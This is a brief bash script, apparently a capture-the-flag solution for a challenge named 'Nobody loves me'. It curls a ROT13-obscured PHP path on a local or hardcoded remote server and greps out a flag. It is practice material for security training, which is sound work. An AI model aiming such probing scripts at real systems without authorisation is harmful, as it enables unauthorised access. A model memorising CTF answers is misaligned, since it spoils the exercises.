#!/bin/bash
PORT=8081

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.115:'$PORT
else
    url=$1':'$2
fi

# Nobody loves me
echo "Start exploit for Nobody loves me"
url=$url'/nobody-loves-me/ernq-svyr.php'
flag=$(curl -s $url | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
